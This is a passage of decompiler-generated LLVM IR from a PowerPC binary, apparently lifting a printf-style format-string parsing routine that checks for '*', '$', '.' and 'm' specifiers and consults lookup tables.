  %v2_1000a9a4 = sub nuw nsw i32 -1, %v1_1000a9a0
  %v3_1000a9a4 = and i32 %v0_1000a994, %v2_1000a9a4
  store i32 %v3_1000a9a4, i32* %r6.global-to-local, align 4
  br i1 %v3_1000a99c, label %dec_label_pc_1000a9b4, label %dec_label_pc_1000a880

dec_label_pc_1000a9b0:                            ; preds = %dec_label_pc_1000a8dc, %dec_label_pc_1000a92c
  store i32 %v0_1000a8dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a9b4

dec_label_pc_1000a9b4:                            ; preds = %dec_label_pc_1000a940, %dec_label_pc_1000a990, %dec_label_pc_1000a9b0
  %v0_1000a9e8 = phi i32 [ 0, %dec_label_pc_1000a990 ], [ %v0_1000a908, %dec_label_pc_1000a940 ], [ %v0_1000a908, %dec_label_pc_1000a9b0 ]
  %v1_1000a9f4 = phi i32 [ %v0_1000a978, %dec_label_pc_1000a990 ], [ %v0_1000a938, %dec_label_pc_1000a940 ], [ %v0_1000a938, %dec_label_pc_1000a9b0 ]
  %v0_1000a9f0 = phi i32 [ %v1_1000a964, %dec_label_pc_1000a990 ], [ %v0_1000a8dc, %dec_label_pc_1000a940 ], [ %v0_1000a8dc, %dec_label_pc_1000a9b0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000a990 ], [ %stack_var_-84.1, %dec_label_pc_1000a940 ], [ %stack_var_-84.1, %dec_label_pc_1000a9b0 ]
  %v1_1000a9b4 = inttoptr i32 %v0_1000a9f0 to i8*
  %v2_1000a9b4 = load i8, i8* %v1_1000a9b4, align 1
  %v3_1000a9b4 = zext i8 %v2_1000a9b4 to i32
  store i32 %v3_1000a9b4, i32* %r0.global-to-local, align 4
  %v3_1000a9b8 = icmp eq i8 %v2_1000a9b4, 42
  br i1 %v3_1000a9b8, label %dec_label_pc_1000a9c0, label %dec_label_pc_1000aa00

dec_label_pc_1000a9c0:                            ; preds = %dec_label_pc_1000a9b4
  %v0_1000a9c0 = load i32, i32* @r26, align 4
  %v3_1000a9c0 = icmp eq i32 %v0_1000a9c0, 0
  br i1 %v3_1000a9c0, label %dec_label_pc_1000a9f0, label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a9c0
  %v1_1000a9c8 = inttoptr i32 %v1_1000a9f4 to i8*
  %v2_1000a9c8 = load i8, i8* %v1_1000a9c8, align 1
  %v3_1000a9c8 = zext i8 %v2_1000a9c8 to i32
  store i32 %v3_1000a9c8, i32* %r0.global-to-local, align 4
  %v3_1000a9cc = icmp eq i8 %v2_1000a9c8, 36
  br i1 %v3_1000a9cc, label %dec_label_pc_1000a9d4, label %dec_label_pc_1000acc0

dec_label_pc_1000a9d4:                            ; preds = %dec_label_pc_1000a9c8
  %tmp60 = icmp slt i32 %v0_1000a9e8, 1
  br i1 %tmp60, label %dec_label_pc_1000acc0, label %dec_label_pc_1000a9dc

dec_label_pc_1000a9dc:                            ; preds = %dec_label_pc_1000a9d4
  %v0_1000a9dc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a9dc = mul i32 %v0_1000a9dc, -4
  %v1_1000a9e0 = add i32 %v1_1000a9f4, 1
  store i32 %v1_1000a9e0, i32* @r30, align 4
  %v0_1000a9e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000a9e4 = add i32 %v0_1000a9e4, %v1_1000a9dc
  store i32 %v2_1000a9e4, i32* %r9.global-to-local, align 4
  %v2_1000a9e8 = add i32 %v2_1000a9e4, 12
  %v3_1000a9e8 = inttoptr i32 %v2_1000a9e8 to i32*
  store i32 %v0_1000a9e8, i32* %v3_1000a9e8, align 4
  %v0_1000aa08.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a9fc

dec_label_pc_1000a9f0:                            ; preds = %dec_label_pc_1000a9c0
  %v1_1000a9f0 = add i32 %v0_1000a9f0, 1
  store i32 %v1_1000a9f0, i32* %r0.global-to-local, align 4
  %v4_1000a9f4 = icmp eq i32 %v1_1000a9f0, %v1_1000a9f4
  br i1 %v4_1000a9f4, label %dec_label_pc_1000a9fc, label %dec_label_pc_1000acc0

dec_label_pc_1000a9fc:                            ; preds = %dec_label_pc_1000a9f0, %dec_label_pc_1000a9dc
  %v0_1000aa08.pre = phi i32 [ %v1_1000a9f4, %dec_label_pc_1000a9f0 ], [ %v0_1000aa08.pre.pre, %dec_label_pc_1000a9dc ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000aa00

dec_label_pc_1000aa00:                            ; preds = %dec_label_pc_1000a9b4, %dec_label_pc_1000a9fc
  %v0_1000aa08 = phi i32 [ %v1_1000a9f4, %dec_label_pc_1000a9b4 ], [ %v0_1000aa08.pre, %dec_label_pc_1000a9fc ]
  %v0_1000aa18 = phi i32 [ %v0_1000a9e8, %dec_label_pc_1000a9b4 ], [ -2147483648, %dec_label_pc_1000a9fc ]
  %v0_1000aa00 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000aa00 = icmp eq i32 %v0_1000aa00, 0
  %v1_1000aa08 = inttoptr i32 %v0_1000aa08 to i8*
  br i1 %v3_1000aa00, label %dec_label_pc_1000aa08, label %dec_label_pc_1000aa2c

dec_label_pc_1000aa08:                            ; preds = %dec_label_pc_1000aa00
  %v2_1000aa08 = load i8, i8* %v1_1000aa08, align 1
  %v3_1000aa08 = zext i8 %v2_1000aa08 to i32
  store i32 %v3_1000aa08, i32* %r0.global-to-local, align 4
  %v3_1000aa0c = icmp eq i8 %v2_1000aa08, 46
  br i1 %v3_1000aa0c, label %dec_label_pc_1000aa14, label %dec_label_pc_1000aa24

dec_label_pc_1000aa14:                            ; preds = %dec_label_pc_1000aa08
  %v1_1000aa14 = add i32 %v0_1000aa08, 1
  store i32 %v0_1000aa18, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a880

dec_label_pc_1000aa24:                            ; preds = %dec_label_pc_1000aa08
  store i32 %v0_1000aa18, i32* @r31, align 4
  br label %dec_label_pc_1000aa2c

dec_label_pc_1000aa2c:                            ; preds = %dec_label_pc_1000aa00, %dec_label_pc_1000aa24
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000aa24 ], [ %v0_1000aa18, %dec_label_pc_1000aa00 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000aa30 = load i8, i8* %v1_1000aa08, align 1
  store i32 ptrtoint ([9 x i8]* @global_var_10016024.300 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000aa38

dec_label_pc_1000aa38:                            ; preds = %dec_label_pc_1000aa44, %dec_label_pc_1000aa2c
  %v0_1000aa44 = phi i32 [ %v1_1000aa44, %dec_label_pc_1000aa44 ], [ ptrtoint ([9 x i8]* @global_var_10016024.300 to i32), %dec_label_pc_1000aa2c ]
  %v1_1000aa38 = inttoptr i32 %v0_1000aa44 to i8*
  %v2_1000aa38 = load i8, i8* %v1_1000aa38, align 1
  %v3_1000aa38 = zext i8 %v2_1000aa38 to i32
  store i32 %v3_1000aa38, i32* %r0.global-to-local, align 4
  %v4_1000aa3c = icmp eq i8 %v2_1000aa30, %v2_1000aa38
  br i1 %v4_1000aa3c, label %dec_label_pc_1000a808, label %dec_label_pc_1000aa44

dec_label_pc_1000aa44:                            ; preds = %dec_label_pc_1000aa38
  %v1_1000aa44 = add i32 %v0_1000aa44, 1
  %v2_1000aa44 = inttoptr i32 %v1_1000aa44 to i8*
  %v3_1000aa44 = load i8, i8* %v2_1000aa44, align 1
  %v4_1000aa44 = zext i8 %v3_1000aa44 to i32
  store i32 %v4_1000aa44, i32* %r0.global-to-local, align 4
  store i32 %v1_1000aa44, i32* %r11.global-to-local, align 4
  %v3_1000aa48 = icmp eq i8 %v3_1000aa44, 0
  br i1 %v3_1000aa48, label %dec_label_pc_1000aa50, label %dec_label_pc_1000aa38

dec_label_pc_1000aa50:                            ; preds = %dec_label_pc_1000aa44, %dec_label_pc_1000a808
  %v0_1000aa78 = phi i32 [ %v1_1000a808, %dec_label_pc_1000a808 ], [ %v0_1000aa08, %dec_label_pc_1000aa44 ]
  %v0_1000aa74 = phi i32 [ %v0_1000aa44, %dec_label_pc_1000a808 ], [ %v1_1000aa44, %dec_label_pc_1000aa44 ]
  %v2_1000aa58 = sub i32 %v0_1000aa74, ptrtoint ([9 x i8]* @global_var_10016024.300 to i32)
  store i32 %v2_1000aa58, i32* %r9.global-to-local, align 4
  %v2_1000aa5c = icmp sgt i32 %v2_1000aa58, 1
  br i1 %v2_1000aa5c, label %dec_label_pc_1000aa7c, label %dec_label_pc_1000aa64

dec_label_pc_1000aa64:                            ; preds = %dec_label_pc_1000aa50
  %v1_1000aa64 = inttoptr i32 %v0_1000aa78 to i8*
  %v2_1000aa64 = load i8, i8* %v1_1000aa64, align 1
  %v3_1000aa64 = zext i8 %v2_1000aa64 to i32
  store i32 %v3_1000aa64, i32* %r0.global-to-local, align 4
  %v1_1000aa68 = inttoptr i32 %v0_1000aa74 to i8*
  %v2_1000aa68 = load i8, i8* %v1_1000aa68, align 1
  %v3_1000aa68 = zext i8 %v2_1000aa68 to i32
  store i32 %v3_1000aa68, i32* %r9.global-to-local, align 4
  %v4_1000aa6c = icmp eq i8 %v2_1000aa64, %v2_1000aa68
  br i1 %v4_1000aa6c, label %dec_label_pc_1000aa74, label %dec_label_pc_1000aa7c

dec_label_pc_1000aa74:                            ; preds = %dec_label_pc_1000aa64
  %v1_1000aa74 = add i32 %v0_1000aa74, 9
  store i32 %v1_1000aa74, i32* %r11.global-to-local, align 4
  %v1_1000aa78 = add i32 %v0_1000aa78, 1
  store i32 %v1_1000aa78, i32* @r30, align 4
  br label %dec_label_pc_1000aa7c

dec_label_pc_1000aa7c:                            ; preds = %dec_label_pc_1000aa64, %dec_label_pc_1000aa50, %dec_label_pc_1000aa74
  %v0_1000aa80 = phi i32 [ %v0_1000aa74, %dec_label_pc_1000aa64 ], [ %v0_1000aa74, %dec_label_pc_1000aa50 ], [ %v1_1000aa74, %dec_label_pc_1000aa74 ]
  %v0_1000aa7c = phi i32 [ %v0_1000aa78, %dec_label_pc_1000aa64 ], [ %v0_1000aa78, %dec_label_pc_1000aa50 ], [ %v1_1000aa78, %dec_label_pc_1000aa74 ]
  %v1_1000aa7c = inttoptr i32 %v0_1000aa7c to i8*
  %v2_1000aa7c = load i8, i8* %v1_1000aa7c, align 1
  %v3_1000aa7c = zext i8 %v2_1000aa7c to i32
  store i32 %v3_1000aa7c, i32* @r7, align 4
  %v1_1000aa80 = add i32 %v0_1000aa80, 9
  %v2_1000aa80 = inttoptr i32 %v1_1000aa80 to i8*
  %v3_1000aa80 = load i8, i8* %v2_1000aa80, align 1
  %v4_1000aa80 = zext i8 %v3_1000aa80 to i32
  store i32 %v4_1000aa80, i32* %r0.global-to-local, align 4
  %v3_1000aa84 = icmp eq i8 %v2_1000aa7c, 0
  %v1_1000aa88 = mul nuw nsw i32 %v4_1000aa80, 256
  store i32 %v1_1000aa88, i32* @r10, align 4
  br i1 %v3_1000aa84, label %dec_label_pc_1000acc0, label %dec_label_pc_1000aa90

dec_label_pc_1000aa90:                            ; preds = %dec_label_pc_1000aa7c
  %v1_1000aa94 = and i32 %v1_1000aa88, 1024
  store i32 %v1_1000aa94, i32* %r0.global-to-local, align 4
  %v3_1000aa94 = icmp eq i32 %v1_1000aa94, 0
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v3_1000aaa0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000aaa0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016058.302 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10016064.301 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aab0

dec_label_pc_1000aab0:                            ; preds = %dec_label_pc_1000ab14, %dec_label_pc_1000aa90
  %v1_1000aabc = phi i32 [ %v1_1000ab14, %dec_label_pc_1000ab14 ], [ ptrtoint ([21 x i8]* @global_var_10016064.301 to i32), %dec_label_pc_1000aa90 ]
  %v1_1000aab0 = inttoptr i32 %v1_1000aabc to i8*
  %v2_1000aab0 = load i8, i8* %v1_1000aab0, align 1
  %v3_1000aab0 = zext i8 %v2_1000aab0 to i32
  store i32 %v3_1000aab0, i32* %r0.global-to-local, align 4
  %v4_1000aab4 = icmp eq i8 %v2_1000aab0, %v2_1000aa7c
  br i1 %v4_1000aab4, label %dec_label_pc_1000aabc, label %dec_label_pc_1000ab14

dec_label_pc_1000aabc:                            ; preds = %dec_label_pc_1000aab0
  %v2_1000aabc = sub i32 %v1_1000aabc, ptrtoint ([21 x i8]* @global_var_10016064.301 to i32)
  %tmp61 = icmp slt i32 %v2_1000aabc, 18
  %brmerge = or i1 %v3_1000aa94, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000aad0, label %dec_label_pc_1000aacc

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aabc
  %v1_1000aacc = add i32 %v2_1000aabc, -2
  br label %dec_label_pc_1000aad0

dec_label_pc_1000aad0:                            ; preds = %dec_label_pc_1000aabc, %dec_label_pc_1000aacc
  %storemerge = phi i32 [ %v1_1000aacc, %dec_label_pc_1000aacc ], [ %v2_1000aabc, %dec_label_pc_1000aabc ]
  %v0_1000aad0 = phi i32 [ %v1_1000aacc, %dec_label_pc_1000aacc ], [ %v2_1000aabc, %dec_label_pc_1000aabc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000aad0 = load i32, i32* @r28, align 4
  %v2_1000aad0 = add i32 %v1_1000aad0, 32
  %v3_1000aad0 = inttoptr i32 %v2_1000aad0 to i32*
  store i32 %v0_1000aad0, i32* %v3_1000aad0, align 4
  store i32 ptrtoint (i32* @global_var_10016057.303 to i32), i32* %r11.global-to-local, align 4
  %v0_1000aadc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aad8

dec_label_pc_1000aad8:                            ; preds = %dec_label_pc_1000aad8, %dec_label_pc_1000aad0
  %v0_1000aad8 = phi i32 [ %v1_1000aad8, %dec_label_pc_1000aad8 ], [ ptrtoint (i32* @global_var_10016057.303 to i32), %dec_label_pc_1000aad0 ]
  %v1_1000aad8 = add i32 %v0_1000aad8, 1
  %v2_1000aad8 = inttoptr i32 %v1_1000aad8 to i8*
  %v3_1000aad8 = load i8, i8* %v2_1000aad8, align 1
  %v4_1000aad8 = zext i8 %v3_1000aad8 to i32
  store i32 %v4_1000aad8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000aad8, i32* %r11.global-to-local, align 4
  %v3_1000aadc = icmp sgt i32 %v0_1000aadc.pre, %v4_1000aad8
  br i1 %v3_1000aadc, label %dec_label_pc_1000aad8, label %dec_label_pc_1000aae4

dec_label_pc_1000aae4:                            ; preds = %dec_label_pc_1000aad8
  %v0_1000aae4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000aae4 = sub i32 %v1_1000aad8, %v0_1000aae4
  %v1_1000aaec = mul i32 %v2_1000aae4, 2
  store i32 %v1_1000aaec, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016048.304 to i32), i32* %r9.global-to-local, align 4
  %v2_1000aaf4 = add i32 %v1_1000aaec, ptrtoint (i32* @global_var_10016048.304 to i32)
  %v3_1000aaf4 = inttoptr i32 %v2_1000aaf4 to i16*
  %v4_1000aaf4 = load i16, i16* %v3_1000aaf4, align 2
  %v5_1000aaf4 = sext i16 %v4_1000aaf4 to i32
  store i32 %v5_1000aaf4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016038.305 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10016064.301 to i32), i32* @r8, align 4
  %v2_1000ab04 = add i32 %v1_1000aaec, ptrtoint (i32* @global_var_10016038.305 to i32)
  %v3_1000ab04 = inttoptr i32 %v2_1000ab04 to i16*
  %v4_1000ab04 = load i16, i16* %v3_1000ab04, align 2
  %v5_1000ab04 = sext i16 %v4_1000ab04 to i32
  store i32 %v5_1000ab04, i32* %r9.global-to-local, align 4
  %v2_1000ab08 = or i32 %v5_1000aaf4, %v1_1000aa88
  store i32 %v2_1000ab08, i32* %r0.global-to-local, align 4
  %v2_1000ab0c = and i32 %v5_1000ab04, %v2_1000ab08
  store i32 %v2_1000ab0c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ab20

dec_label_pc_1000ab14:                            ; preds = %dec_label_pc_1000aab0
  %v1_1000ab14 = add i32 %v1_1000aabc, 1
  %v2_1000ab14 = inttoptr i32 %v1_1000ab14 to i8*
  %v3_1000ab14 = load i8, i8* %v2_1000ab14, align 1
  %v4_1000ab14 = zext i8 %v3_1000ab14 to i32
  store i32 %v4_1000ab14, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ab14, i32* @r8, align 4
  %v3_1000ab18 = icmp eq i8 %v3_1000ab14, 0
  br i1 %v3_1000ab18, label %dec_label_pc_1000ab20, label %dec_label_pc_1000aab0

dec_label_pc_1000ab20:                            ; preds = %dec_label_pc_1000ab14, %dec_label_pc_1000aae4
  %v0_1000ab20 = phi i32 [ %v2_1000ab0c, %dec_label_pc_1000aae4 ], [ %v3_1000aaa0, %dec_label_pc_1000ab14 ]
  store i32 %v0_1000ab20, i32* %stack_var_-96, align 4
  %v0_1000ab24 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ab24 = call i32 @__asm_rlwinm(i32 %v0_1000ab24, i32 30, i32 31, i32 31)
  %not.v2_1000ab28 = icmp eq i32 %v1_1000ab24, 0
  %v6_1000ab2c = sext i1 %not.v2_1000ab28 to i32
  store i32 %v6_1000ab2c, i32* %r9.global-to-local, align 4
  %v1_1000ab30 = call i32 @__asm_rlwinm(i32 %v1_1000aa88, i32 0, i32 20, i32 23)
  store i32 %v1_1000ab30, i32* %r0.global-to-local, align 4
  %v1_1000ab34 = call i32 @__asm_rlwinm(i32 %v6_1000ab2c, i32 0, i32 0, i32 27)
  store i32 %v1_1000ab34, i32* %r9.global-to-local, align 4
  %v0_1000ab38 = load i32, i32* @r30, align 4
  %v1_1000ab38 = inttoptr i32 %v0_1000ab38 to i8*
  %v2_1000ab38 = load i8, i8* %v1_1000ab38, align 1
  %v3_1000ab38 = zext i8 %v2_1000ab38 to i32
  store i32 %v3_1000ab38, i32* @r10, align 4
  %v0_1000ab3c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ab3c = call i32 @__asm_rlwinm(i32 %v0_1000ab3c, i32 0, i32 30, i32 28)
  %v1_1000ab40 = add i32 %v1_1000ab34, 48
  store i32 %v1_1000ab40, i32* %r9.global-to-local, align 4
  %v2_1000ab44 = or i32 %v1_1000ab3c, %v1_1000ab30
  store i32 %v2_1000ab44, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000ab4c = load i32, i32* @r10, align 4
  %v1_1000ab4c = load i32, i32* @r28, align 4
  %v2_1000ab4c = add i32 %v1_1000ab4c, 12
  %v3_1000ab4c = inttoptr i32 %v2_1000ab4c to i32*
  store i32 %v0_1000ab4c, i32* %v3_1000ab4c, align 4
  %v0_1000ab50 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000ab50 = load i32, i32* @r28, align 4
  %v2_1000ab50 = add i32 %v1_1000ab50, 4
  %v3_1000ab50 = inttoptr i32 %v2_1000ab50 to i32*
  store i32 %v0_1000ab50, i32* %v3_1000ab50, align 4
  %v0_1000ab54 = load i32, i32* @r31, align 4
  %v1_1000ab54 = load i32, i32* @r28, align 4
  %v2_1000ab54 = add i32 %v1_1000ab54, 8
  %v3_1000ab54 = inttoptr i32 %v2_1000ab54 to i32*
  store i32 %v0_1000ab54, i32* %v3_1000ab54, align 4
  %v0_1000ab58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ab58 = load i32, i32* @r28, align 4
  %v2_1000ab58 = add i32 %v1_1000ab58, 20
  %v3_1000ab58 = inttoptr i32 %v2_1000ab58 to i32*
  store i32 %v0_1000ab58, i32* %v3_1000ab58, align 4
  %v0_1000ab5c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ab5c = load i32, i32* @r28, align 4
  %v2_1000ab5c = add i32 %v1_1000ab5c, 16
  %v3_1000ab5c = inttoptr i32 %v2_1000ab5c to i32*
  store i32 %v0_1000ab5c, i32* %v3_1000ab5c, align 4
  %v0_1000ab60 = load i32, i32* @r7, align 4
  %v1_1000ab60 = load i32, i32* @r28, align 4
  %v2_1000ab60 = add i32 %v1_1000ab60, 28
  %v3_1000ab60 = inttoptr i32 %v2_1000ab60 to i32*
  store i32 %v0_1000ab60, i32* %v3_1000ab60, align 4
  %v0_1000ab64 = load i32, i32* @r8, align 4
  %v1_1000ab64 = inttoptr i32 %v0_1000ab64 to i8*
  %v2_1000ab64 = load i8, i8* %v1_1000ab64, align 1
  %v3_1000ab64 = zext i8 %v2_1000ab64 to i32
  store i32 %v3_1000ab64, i32* %r9.global-to-local, align 4
  %v3_1000ab68 = icmp eq i8 %v2_1000ab64, 0
  br i1 %v3_1000ab68, label %dec_label_pc_1000ab70, label %dec_label_pc_1000ab88

dec_label_pc_1000ab70:                            ; preds = %dec_label_pc_1000ab20
  %v0_1000ab70 = load i32, i32* @r30, align 4
  %v1_1000ab70 = inttoptr i32 %v0_1000ab70 to i8*
  %v2_1000ab70 = load i8, i8* %v1_1000ab70, align 1
  %v3_1000ab70 = zext i8 %v2_1000ab70 to i32
  store i32 %v3_1000ab70, i32* %r0.global-to-local, align 4
  %v3_1000ab74 = icmp eq i8 %v2_1000ab70, 109
  br i1 %v3_1000ab74, label %dec_label_pc_1000ab7c, label %dec_label_pc_1000acc0

dec_label_pc_1000ab7c:                            ; preds = %dec_label_pc_1000ab70
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000ab80 = load i32, i32* @r28, align 4
  %v2_1000ab80 = add i32 %v1_1000ab80, 28
  %v3_1000ab80 = inttoptr i32 %v2_1000ab80 to i32*
  store i32 %v3_1000ab64, i32* %v3_1000ab80, align 4
  %v0_1000ab84 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ab84 = load i32, i32* @r28, align 4
  %v2_1000ab84 = add i32 %v1_1000ab84, 32
  %v3_1000ab84 = inttoptr i32 %v2_1000ab84 to i32*
  store i32 %v0_1000ab84, i32* %v3_1000ab84, align 4
  br label %dec_label_pc_1000ab88

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000ab20, %dec_label_pc_1000ab7c
  %v0_1000ab88 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000ab88, 1
  br i1 %tmp62, label %dec_label_pc_1000ac64, label %dec_label_pc_1000ab90

dec_label_pc_1000ab90:                            ; preds = %dec_label_pc_1000ab88
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000ab94

dec_label_pc_1000ab94:                            ; preds = %dec_label_pc_1000ac4c, %dec_label_pc_1000ab90
  %v0_1000abbc = phi i32 [ 0, %dec_label_pc_1000ab90 ], [ %v1_1000ac50, %dec_label_pc_1000ac4c ]
  %v2_1000ab94 = icmp sgt i32 %v0_1000abbc, 2
  br i1 %v2_1000ab94, label %dec_label_pc_1000abb8, label %dec_label_pc_1000ab9c

dec_label_pc_1000ab9c:                            ; preds = %dec_label_pc_1000ab94
  %v1_1000ab9c = mul i32 %v0_1000abbc, 4
  store i32 %v1_1000ab9c, i32* %r0.global-to-local, align 4
  %v0_1000aba0 = load i32, i32* @r1, align 4
  %v2_1000aba0 = add i32 %v0_1000aba0, %v1_1000ab9c
  store i32 %v2_1000aba0, i32* %r9.global-to-local, align 4
  %v1_1000aba4 = add i32 %v2_1000aba0, 20
  %v2_1000aba4 = inttoptr i32 %v1_1000aba4 to i32*
  %v3_1000aba4 = load i32, i32* %v2_1000aba4, align 4
  store i32 %v3_1000aba4, i32* %r0.global-to-local, align 4
  %v1_1000aba8 = load i32, i32* @r28, align 4
  %v2_1000aba8 = add i32 %v1_1000aba8, %v0_1000abbc
  store i32 %v2_1000aba8, i32* %r9.global-to-local, align 4
  %v1_1000abac = urem i32 %v3_1000aba4, 256
  store i32 %v1_1000abac, i32* %r11.global-to-local, align 4
  %v1_1000abb0 = trunc i32 %v3_1000aba4 to i8
  %v3_1000abb0 = add i32 %v2_1000aba8, 36
  %v4_1000abb0 = inttoptr i32 %v3_1000abb0 to i8*
  store i8 %v1_1000abb0, i8* %v4_1000abb0, align 1
  %v0_1000abc4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000abc4

dec_label_pc_1000abb8:                            ; preds = %dec_label_pc_1000ab94
  %v2_1000abbc = add i32 %v0_1000abbc, %stack_var_-84.3
  store i32 %v2_1000abbc, i32* %r9.global-to-local, align 4
  %v1_1000abc0 = add i32 %v2_1000abbc, -2
  store i32 %v1_1000abc0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000abc4

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000ab9c, %dec_label_pc_1000abb8
  %v0_1000abe4 = phi i32 [ %v0_1000abc4.pre, %dec_label_pc_1000ab9c ], [ %v1_1000abc0, %dec_label_pc_1000abb8 ]
  %v1_1000abc4 = load i32, i32* @r26, align 4
  %v3_1000abc4 = icmp sgt i32 %v0_1000abe4, %v1_1000abc4
  br i1 %v3_1000abc4, label %dec_label_pc_1000abcc, label %dec_label_pc_1000abd8

dec_label_pc_1000abcc:                            ; preds = %dec_label_pc_1000abc4
  %v2_1000abcc = icmp sgt i32 %v0_1000abe4, 9
  br i1 %v2_1000abcc, label %dec_label_pc_1000acc0, label %dec_label_pc_1000abd4

dec_label_pc_1000abd4:                            ; preds = %dec_label_pc_1000abcc
  store i32 %v0_1000abe4, i32* @r26, align 4
  br label %dec_label_pc_1000abd8

dec_label_pc_1000abd8:                            ; preds = %dec_label_pc_1000abc4, %dec_label_pc_1000abd4
  store i32 %v2_1000a874.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000abdc = load i32, i32* @r27, align 4
  %v1_1000abdc = mul i32 %v0_1000abdc, 4
  store i32 %v1_1000abdc, i32* %r0.global-to-local, align 4
  %v2_1000abe0 = add i32 %v1_1000abdc, %v2_1000a874.pre-phi
  %v3_1000abe0 = inttoptr i32 %v2_1000abe0 to i32*
  %v4_1000abe0 = load i32, i32* %v3_1000abe0, align 4
  store i32 %v4_1000abe0, i32* @r31, align 4
  %v1_1000abe4 = add i32 %v0_1000abe4, -1
  store i32 %v1_1000abe4, i32* @r25, align 4
  %v1_1000abe8 = mul i32 %v1_1000abe4, 4
  %v3_1000abec = icmp eq i32 %v4_1000abe0, 8
  %v1_1000abf0 = load i32, i32* @r28, align 4
  %v2_1000abf0 = add i32 %v1_1000abf0, %v1_1000abe8
  store i32 %v2_1000abf0, i32* %r9.global-to-local, align 4
  %v1_1000abf4 = add i32 %v2_1000abf0, 40
  %v2_1000abf4 = inttoptr i32 %v1_1000abf4 to i32*
  %v3_1000abf4 = load i32, i32* %v2_1000abf4, align 4
  store i32 %v3_1000abf4, i32* %r3.global-to-local, align 4
  br i1 %v3_1000abec, label %dec_label_pc_1000ac4c, label %dec_label_pc_1000abfc

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abd8
  %v3_1000abfc = icmp eq i32 %v3_1000abf4, 8
  br i1 %v3_1000abfc, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac04

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abfc
  %v4_1000ac04 = icmp eq i32 %v3_1000abf4, %v4_1000abe0
  br i1 %v4_1000ac04, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac0c

dec_label_pc_1000ac0c:                            ; preds = %dec_label_pc_1000ac04
  %v1_1000ac0c = call i32 @_promoted_size(i32 %v3_1000abf4)
  store i32 %v1_1000ac0c, i32* @r29, align 4
  %v0_1000ac14 = load i32, i32* @r31, align 4
  store i32 %v0_1000ac14, i32* %r3.global-to-local, align 4
  %v1_1000ac18 = call i32 @_promoted_size(i32 %v0_1000ac14)
  store i32 %v1_1000ac18, i32* %r3.global-to-local, align 4
  %v0_1000ac24 = call i32 @__asm_mfcr()
  store i32 %v0_1000ac24, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ac24, i32* %r0.global-to-local, align 4
  %v1_1000ac28 = call i32 @__asm_rlwinm(i32 %v0_1000ac24, i32 31, i32 31, i32 31)
  store i32 %v1_1000ac28, i32* %r0.global-to-local, align 4
  %v3_1000ac2c = icmp eq i32 %v1_1000ac28, 0
  br i1 %v3_1000ac2c, label %dec_label_pc_1000ac4c, label %dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge

dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge: ; preds = %dec_label_pc_1000ac0c
  %v0_1000ac38.pre = load i32, i32* @r27, align 4
  %v0_1000ac40.pre = load i32, i32* @r25, align 4
  %v1_1000ac44.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000ac34

dec_label_pc_1000ac34:                            ; preds = %dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge, %dec_label_pc_1000ac04, %dec_label_pc_1000abfc
  %v1_1000ac44 = phi i32 [ %v1_1000ac44.pre, %dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge ], [ %v1_1000abf0, %dec_label_pc_1000ac04 ], [ %v1_1000abf0, %dec_label_pc_1000abfc ]
